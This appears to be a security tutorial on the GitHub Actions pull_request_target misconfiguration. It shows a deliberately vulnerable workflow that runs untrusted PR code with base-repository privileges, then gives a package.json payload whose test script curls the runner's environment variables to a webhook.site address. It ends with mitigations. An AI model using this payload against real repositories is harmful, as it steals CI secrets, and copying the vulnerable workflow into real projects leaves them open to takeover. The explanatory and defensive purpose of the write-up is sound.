GitHub Actions workflows triggered by **pull_request_target** can be dangerous if not properly configured. One of the most common CI/CD security misconfigurations that attackers exploit to gain unauthorized access and execute arbitrary code

### pull_request vs pull_request_target
**pull_request (Safe)**
- Runs in the context of the forked repository (low privileges)
- Does not have write permissions to the target repository
- Cannot modify secrets from the base repository

**pull_request_target (Dangerous if misconfigured)**
- Runs in the context of the base repository (high privileges)
- Has write access to the repository if configured
- Can access repository secrets

### Why is pull_request_target Dangerous?
If an attacker opens a malicious pull request from a fork, the workflow will execute in the base repository's context, allowing them to steal secrets, modify code, or escalate privileges

## Example
```yml
name: Exploit Pull Request Target
on:
  pull_request_target:
    branches:
      - main

jobs:
  dangerous-job:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.ref }}
      - name: Run untrusted code
        run: |
          echo "Running code from untrusted PR..."
          npm install
          npm run build
          npm run test
          
```

### Vuln breakdown here
- Pull Request Target = main
	- This causes workflow to run within the context of the main branch, not the PR branch
- Untrusted Code Execution
	- Potential for malicious activities from PRs, such as secret exfiltration, which could later be used to Privilege Escalation or to move laterally. The following shows that **check out PR code** in the workflow file
	```yml
	uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.ref }}
	```

### Why is this Dangerous?
- Opening a PR containing malicious code in a package.json gets executed against main branch
- Allows for running untrusted code, stealing secrets, etc.

### Why these triggers are being used?
#### pull_request
- Want to test code from external contributors (forks).
- Don’t want to expose secrets or write permissions to untrusted users.
- Common for open-source projects where anyone can open a PR.

#### pull_request_target
- Need to label the PR, post a comment, or run checks that require write access
- Using actions that modify the base repo, like updating commit status or deploying

## Attack
Workflow Logic:
1. Workflow executes when the pull_request_target (the branch being merged into) is a branch called ‘main’. Since this workflow uses pull_request_target instead of pull_request, it will run within the context of the main that it is being merged into.
2. Build runs within a ubuntu based docker container
3. Run step checks out a copy of our code
4. Run step sets up a NodeJs environment
5. Run step installs dependencies
6. Run step runs command to build and test the application
	- Since this workflow runs within the context of the main branch, if we introduce a new package.json file, we can override what the build and test command do and exploit it.

### Payload for the package.json
```yml
{
  "name": "example-project",
  "version": "1.0.0",
  "description": "Example Node.js project",
  "main": "index.js",
  "scripts": {
    "build": "echo 'Building the project...'",
    "test": "curl -X POST https://webhook.site/d9ae103c-6d67-418d-9def-13185195ebbf -d \"$(env)\""
  },
  "dependencies": {
    "express": "^4.17.1"
  },
  "devDependencies": {
    "jest": "^27.0.6"
  },
  "author": "Your Name",
  "license": "MIT"
}
```


## Mitigations
- Require Approval: Require approval for external contributors.
	- One of the simplest and most effective ways to secure workflows is to require approval for any workflows triggered by external contributors (i.e., contributors outside the organization). This setting can be enabled in the repository settings.
- Disable Secrets Access: Disable secrets for `pull_request_target` workflows.
- Sanitize Input: Avoid direct use of `pull_request.head.ref`.
- Restrict Permissions: Limit `GITHUB_TOKEN` permissions.
	- By default, workflows are only granted Read permissions. However, repositories created prior to February 23rd , 2024 had both Read and Write permissions by default, granting excessive permissions to workflows.
- Manual Review: Implement manual review steps.
- Prefer `pull_request`: Use `pull_request` over `pull_request_target` when possible
